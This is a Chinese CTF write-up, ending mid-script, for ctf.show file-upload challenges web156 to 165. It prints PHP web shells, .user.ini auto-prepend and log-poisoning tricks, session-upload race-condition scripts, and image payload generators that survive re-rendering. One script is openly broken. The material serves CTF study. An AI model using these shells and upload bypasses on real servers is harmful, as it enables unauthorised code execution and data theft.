title="web156(过滤[])"></a>web156(过滤[])</h1><p>这里其实过滤了[]，但是可以用{}进行代替它<br>用web154方法可以通过！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;pass&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改木马为这儿就可以了！<br><img src="https://img-blog.csdnimg.cn/20210413161412876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后！<br><img src="https://img-blog.csdnimg.cn/20210413161612638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web157-过滤"><a href="#web157-过滤" class="headerlink" title="web157(过滤;)"></a>web157(过滤;)</h1><p>这里将;给过滤了，我们可以用反引号来进行绕过！<br>一样用上题(web154)的办法可以通过，但过滤了分号，把短标签后面的;去掉！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&quot;tac ../f*&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210413162624523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>上题一样的做法！</p><hr /><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>这里是将()给ban了，我们采用反引号来执行命令，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="meta">&lt;?=</span>`cat ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210413162942614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web160-日志包含"><a href="#web160-日志包含" class="headerlink" title="web160(日志包含)"></a>web160(日志包含)</h1><p>先说说第一种做法！<br>Nginx日志的默认路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> (log被过滤)</span><br></pre></td></tr></table></figure><p>依旧是先上传.user.ini文件，然后上传图片，内容如上！然后一句话写入User-Agent。.<br>最后蚁剑链接！<br><img src="https://img-blog.csdnimg.cn/20210413165237138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">然后开始链接！<br><img src="https://img-blog.csdnimg.cn/2021041316543210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>OK!<br>第二种方法！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;ph&quot;</span>.<span class="string">&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="string">&quot;hp&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>图片上传的时候写入这个东东！<br><img src="https://img-blog.csdnimg.cn/20210413170118289.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后访问upload页面再进行base64解码即可！<br><img src="https://img-blog.csdnimg.cn/20210413170240613.png" alt="在这里插入图片描述"></p><hr /><h1 id="web161-检查十六进制头"><a href="#web161-检查十六进制头" class="headerlink" title="web161(检查十六进制头)"></a>web161(检查十六进制头)</h1><blockquote><p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p></blockquote><p>这道题对图片的文件头进行了检测！<br>所以在上题的基础上都加个 <strong>GIF89a</strong> 图片头就可以了<br>.user.ini也得加，图片也得加，都得加上去！<br>只要加上去，上题的两种方法都可以的！<br><img src="https://img-blog.csdnimg.cn/20210413171321943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后访问页面就可以了！再进行一次base64解码就行了！<br><img src="https://img-blog.csdnimg.cn/20210413171922681.png" alt="在这里插入图片描述"></p><hr /><h1 id="web162-web163-未做"><a href="#web162-web163-未做" class="headerlink" title="web162~web163(未做)"></a>web162~web163(未做)</h1><p>这次把.给ban了，我们使用session文件包含!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/tmp/sess_harker</span><br></pre></td></tr></table></figure><p>.user.ini上传内容如上！<br><img src="https://img-blog.csdnimg.cn/20210413172444824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后写个脚本！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1073efc7-0752-4fa7-8153-657adfb7cf0b.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;GIF89a\nharker&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;3.png&#x27;</span>,f,<span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">        response = session.post(url+<span class="string">&quot;upload.php&quot;</span>,cookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;harker&#x27;</span>&#125;,data=data,files=files)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;NO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__mian__&#x27;</span>:</span><br><span class="line">    session = requsets.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure><p>这是条件竞争的脚本！<br>不过上面这里好像运行会报错！<br>用BP也是可以的！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io<span class="comment">#io库</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#requests路</span></span><br><span class="line"><span class="keyword">import</span> threading<span class="comment">#多线程库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1073efc7-0752-4fa7-8153-657adfb7cf0b.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;harker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span><span class="comment">#写入函数</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():<span class="comment">#当事件开启</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">        response = session.post(<span class="comment">#post形式访问</span></span><br><span class="line">            url,<span class="comment">#url不变</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,<span class="comment">#cookies赋值</span></span><br><span class="line">            data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;</span>&#125;,<span class="comment">#文件内容</span></span><br><span class="line">            files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;harker.txt&#x27;</span>,f)&#125;<span class="comment">#文件形式</span></span><br><span class="line">        )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span><span class="comment">#读取函数</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():<span class="comment">#当事件开启</span></span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload/index.php&#x27;</span>.<span class="built_in">format</span>(sessid))<span class="comment">#以get形式访问</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:<span class="comment">#如果存在flag则打印出内容</span></span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()<span class="comment">#关闭事件</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;NO&#x27;</span>)<span class="comment">#输出NO</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()<span class="comment">#定义事件</span></span><br><span class="line">    event.<span class="built_in">set</span>()<span class="comment">#开启事件</span></span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:<span class="comment">#上下文管理，可以处理异常</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):<span class="comment">#开启线程</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):<span class="comment">#开启线程</span></span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个是可以运行的！<br>我吗再来尝试尝试用BP来进行尝试！<br><img src="https://img-blog.csdnimg.cn/20210413190620297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再上传1文件！文件内容是包含harker的session文件！<br>这里也内容也可以直接写为<strong>auto_prepend_file=/tmp/sess_harker</strong><br>然后下面这一步上传1文件就可以跳过了<br>内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;&#x2F;tmp&#x2F;sess_harker&quot;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210413191401236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时来构造sess_harker文件发送post数据包！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://474bc699-60dd-4a99-91ef-2808a96c2d4a.chall.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210413192050720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里直接攻击！<br><img src="https://img-blog.csdnimg.cn/20210415234400778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>这道题的做法和上一题一模一样，但是这里完全用BP模拟一遍！<br><img src="https://img-blog.csdnimg.cn/20210416090439633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里上传了.user.ini配置文件！接下来就是条件竞争和表单攻击了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;ac213a56-657c-4a83-b9ac-b69d3c404667.challenge.ctf.show:8080&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>这是表单的代码！<br><img src="https://img-blog.csdnimg.cn/20210416091517547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web164-二次渲染-未做"><a href="#web164-二次渲染-未做" class="headerlink" title="web164(二次渲染)(未做)"></a>web164(二次渲染)(未做)</h1><p>这里是没有的上传php图片是被刷新掉了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>借助脚本来进行生成一个进行上传！<br>这是来借助php的gd库！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php-gd</span><br></pre></td></tr></table></figure><p>上面是下载的命令！<br><img src="https://img-blog.csdnimg.cn/20210415200847602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再上传这个图片！再进行查看图片，可以得知图片路径！<br>此时我们便可以执行&lt;=? $ _GET[0]( $ _POST[1]);?&gt;这个语句了！</p><hr /><h1 id="web165-JPG图片二次渲染-未做"><a href="#web165-JPG图片二次渲染-未做" class="headerlink" title="web165(JPG图片二次渲染)(未做)"></a>web165(JPG图片二次渲染)(未做)</h1><p>jpg渲染脚本！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs 